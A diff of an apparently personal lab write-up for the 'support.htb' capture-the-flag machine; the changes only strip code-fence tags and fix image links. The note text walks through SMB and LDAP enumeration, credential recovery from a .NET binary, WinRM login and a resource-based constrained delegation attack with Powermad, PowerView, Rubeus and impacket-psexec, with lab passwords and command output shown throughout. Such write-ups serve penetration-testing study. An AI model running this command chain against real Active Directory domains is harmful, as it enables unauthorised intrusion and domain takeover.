@@ -2,7 +2,7 @@
 - 
 ## Nmap Enumeration
 - We pass these commands:
-	```bash
+	```
 nmap -sV -sC -vv 10.10.11.174
 nmap -sU --top-ports=10 -vv 10.10.11.174
 
@@ -58,7 +58,7 @@ Host script results:
 		- 5985
 ## SMB Enumeration
 - We pass these initial SMB commands in smbclient and get the same output for all (no password entered):
-	```bash
+	```
 smbclient -U '' -L //10.10.11.174
 smbclient -U 'guest' -L //10.10.11.174
 smbclient -U 'anonymous' -L //10.10.11.174
@@ -74,7 +74,7 @@ smbclient -U 'anonymous' -L //10.10.11.174
         SYSVOL          Disk      Logon server share 
 ```
 - We check support-tools as its not part of the normal share files found
-	```bash
+	```
 smbclient //10.10.11.174/support-tools -N
 
 ---OUTPUT---
@@ -91,7 +91,7 @@ smb: \> ls
 
 ```
 - I got the file, unzipped it and read it :
-	```bash
+	```
 smb: > get UserInfo.exe.zip
 
 ---Local-Machine---
@@ -111,10 +111,10 @@ cat UserInfo.exe.config
 	- Failed to connect
 ## Wireshark
 - We open up wireshark to check whats going on and we find some credentials
-	- ![[Pasted image 20250405171715.png]]
+	- ![Pasted image 20250405171715.png](../Attachments/Pasted20image%2020250405171715.png)
 		- `ldap : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`
 - We try crackmapexec SMB with these credentials and get a hit
-	```bash
+	```
  crackmapexec smb 10.10.11.174 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
 
 ---OUTPUT---
@@ -123,15 +123,15 @@ SMB         10.10.11.174    445    DC               [+] support.htb\ldap:nvEfEK1
 ## ALTERNATE METHOD : Using static analysis of the .net file to gain user ldap password:
 - I used dnSPy (ILSpy for Kali) to analyse the UserInfo.exe file
 	- Under Userinfo.exe>UserInfo.Services we see our LDAP query.
-		```bash
+		```
 string.Password = Protected.getPassword()
 ```
 	- Below it we find a code Protected with a private static key 
 		- `0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E`
-- ![[Pasted image 20250405223608.png]]
+- ![Pasted image 20250405223608.png](../Attachments/Pasted20image%2020250405223608.png)
 
 - The code :
-	```bash
+	```
 using System;
 using System.Text;
 
@@ -165,13 +165,13 @@ namespace UserInfo.Services
 	- CyberChef (From Base64): https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=VTI4Z2JHOXVaeUJoYm1RZ2RHaGhibXR6SUdadmNpQmhiR3dnZEdobElHWnBjMmd1
 		- the first XOR with armando we need to choose UTF8 or Latin1 (Definitely NOT HEX)
 		- The second one we put decimal 
-		- ![[Pasted image 20250405224659.png]]
+		- ![Pasted image 20250405224659.png](../Attachments/Pasted20image%2020250405224659.png)
 		- We get the password : `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`
 ## BloodHound Enumeration
 - Object ID above 1000 are non default accounts
 	- admin is 500
 - bloodhound commands:
-	```bash
+	```
 bloodhound-python --dns-tcp -ns 10.10.11.174 -d support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
 bloodhound-python --dns-tcp -ns 10.10.11.174 -d support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -c all
 ```
@@ -180,11 +180,11 @@ bloodhound-python --dns-tcp -ns 10.10.11.174 -d support.htb -u 'ldap' -p 'nvEfEK
 ## Initial Foothold with LDAPsearch and SMB (with crackmapexec) 
 **Note: Another GUI friendly tool instead of ldapsearch that can be used for this enumeration is Apache Directory Studio**
 - we pass the command:
-	```bash
+	```
 ldapsearch -H ldap://support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" > ldap.out
 ```
 	- We vi into it and search for "info:" via / command:
-		```bash
+		```
 vi ldap.out
 > /info:
 
@@ -200,14 +200,14 @@ sAMAccountName: support
 ```
 		- we find some creds : support : Ironside47pleasure40Watchful
 - We try crackmapexec SMB with these credentials and get a match:
-	```bash
+	```
 crackmapexec smb 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
 
 ---OUTPUT---
 SMB         10.10.11.174    445    DC               [+] support.htb\support:Ironside47pleasure40Watchful 
 ```
 	- At this point we can use evil-winrm to login to the machine as support and grab the user flag.
-		```bash
+		```
 evil-winrm -i support.htb -u support -p Ironside47pleasure40Watchful
 cd ..
 cd Desktop
@@ -229,7 +229,7 @@ type user.txt
 					- Powerview : https://github.com/PowerShellMafia/PowerSploit
 					- Rubeus.exe : https://github.com/Flangvik/SharpCollection
 				- Send it to target :
-					```bash
+					```
 ---Local-Machine---
 python -m http.server 8001  # at location of files to send
 
@@ -254,14 +254,14 @@ ms-ds-machineaccountquota
 		- Should change to harden system
 - Now we start the attack (from bloodhound info):
 	- First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
-		```bash
+		```
 New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
 
 ---OUTPUT---
 [+] Machine account attackersystem added
 ```
 	- PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account::
-		```bash
+		```
 > $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
 > $ComputerSid
 
@@ -270,7 +270,7 @@ S-1-5-21-1677581083-3380853377-188903654-5601
 ```
 	**NOTE: Password should probably follow one uppercase, one lowercase, one number, one special character atleast to make sure we don't come across issues if password complexity was set**
 	- We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE (this should give us authentication on behalf of the user):
-		```bash
+		```
 > $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
 > $SD
 > $SDBytes = New-Object byte[] ($SD.BinaryLength)
@@ -286,11 +286,11 @@ ResourceManagerControl : 0
 BinaryLength           : 80
 ```
 	- Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case (settnig the ms allow.. to act on behalf of the bytes we just created):
-		```bash
+		```
 Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
 ```
 	- Execute Rubeus
-		```bash
+		```
 .\Rubeus.exe hash /password:Summer2018!
 
 ---OUTPUT---
@@ -301,7 +301,7 @@ Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoacto
 ```
 	- S4U (delegation attack) :And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
 		- this what allow you to impersonate users (constrained authentication)
-		```bash
+		```
 .\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt
 
 ---OUTPUT---
@@ -347,14 +347,14 @@ Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoacto
 
 - Copy to vi and clean with %s/ //g
 	- decode base64 and convert to ccache for psexec to use
-		```bash
+		```
 vi ticket.bs64 # Copy and clean ticket
 base64 -d ticket.bs64 > ticket.kirbi
 impacket-ticketConverter ticket.kirbi ticket.ccache
 KS
 ```
 	- Access system with ticket:
-		```bash
+		```
 KRB5CCNAME=ticket.ccache impacket-psexec -k -no-pass support.htb/administrator@dc.support.htb
 ```
 	- What is the name of the environment variable on our local system that we'll set to that ccache file to allow use of files like psexec.py with the -k and -no-pass options?
